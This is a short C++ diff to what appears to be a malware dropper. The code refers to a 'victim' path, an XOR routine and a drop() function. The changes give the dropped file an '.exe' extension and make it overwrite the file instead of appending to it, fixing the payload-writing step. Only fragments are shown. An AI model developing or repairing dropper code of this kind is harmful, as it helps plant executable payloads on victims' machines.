@@ -71,6 +71,8 @@ int main(int argc, char* argv[])
 
 	std::filesystem::path absolute_victim_name2 = absolute_victim_path1 / DROPPER_OUTPUT;
 
+	absolute_victim_name2 += ".exe";
+
 	std::string absolute_victim_name = absolute_victim_name2.string();
 
 	victim_name = new char[absolute_victim_name.size() + 1];
@@ -221,7 +223,7 @@ void* XOR(void* data, int size) {
 void drop(int size, void* buffer)
 {
 	printf("This is name: %s", name);
-	FILE* f = fopen(name, "ab");
+	FILE* f = fopen(name, "wb");
 	// traverse byte list
 	if (!f) {
 		std::cout << "Dropping failed due to file error." << std::endl;
